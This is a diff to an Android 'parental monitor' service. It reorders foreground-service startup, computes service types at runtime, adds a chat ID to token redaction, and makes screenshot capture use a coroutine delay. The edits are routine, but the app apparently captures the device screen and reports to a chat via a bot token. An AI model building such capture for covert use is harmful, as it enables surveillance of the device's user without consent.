@@ -152,8 +152,8 @@ class MonitoringService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        startForegroundImmediate()
         preferencesManager = PreferencesManager.getInstance(this)
+        startForegroundImmediate()
         try {
             Thread {
                 try {
@@ -255,10 +255,15 @@ class MonitoringService : Service() {
                 .setShowWhen(false)
             if (tap != null) builder.setContentIntent(tap)
             val notification = builder.build()
+            val startTypes = try {
+                computeForegroundTypes()
+            } catch (_: Exception) {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 try {
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                    appliedFgsTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    startForeground(NOTIFICATION_ID, notification, startTypes)
+                    appliedFgsTypes = startTypes
                 } catch (_: Exception) {
                     startForeground(NOTIFICATION_ID, notification)
                 }
@@ -324,7 +329,12 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
             ""
         }
-        return com.redeye.parentalmonitor.utils.Redact.token(value, token)
+        val chat = try {
+            cachedChatId.ifEmpty { preferencesManager.chatId }
+        } catch (_: Exception) {
+            ""
+        }
+        return com.redeye.parentalmonitor.utils.Redact.token(value, token, chat)
     }
 
     private fun startMonitoring() {
@@ -3121,7 +3131,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun takeScreenshotFrame(): File? {
+    private suspend fun takeScreenshotFrame(): File? {
         val code = try { preferencesManager.screenshotResultCode } catch (_: Exception) { 0 }
         val uri = try { preferencesManager.screenshotData } catch (_: Exception) { "" }
         if (code == 0 || uri.isEmpty()) return null
@@ -3153,7 +3163,7 @@ class MonitoringService : Service() {
             for (i in 0 until 12) {
                 try { image = reader.acquireLatestImage() } catch (_: Exception) { }
                 if (image != null) break
-                try { Thread.sleep(100) } catch (_: Exception) { }
+                kotlinx.coroutines.delay(100)
             }
             val img = image ?: return null
             try {
